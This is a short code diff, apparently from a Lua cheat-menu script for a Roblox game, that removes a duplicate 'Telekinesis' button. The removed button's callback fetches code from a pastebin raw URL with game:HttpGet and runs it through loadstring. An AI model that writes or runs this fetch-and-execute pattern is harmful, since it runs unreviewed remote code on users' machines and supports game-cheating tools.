@@ -104,13 +104,6 @@ local telekinesis = Tab:CreateButton({
    end,
 })
 
-local telekinesis = Tab:CreateButton({
-   Name = "Telekinesis",
-   Callback = function()
-      loadstring(game:HttpGet("https://pastebin.com/raw/KduE9A6z"))()
-   end,
-})
-
 local Emotes = Tab:CreateButton({
    Name = "Emotes",
    Callback = function()
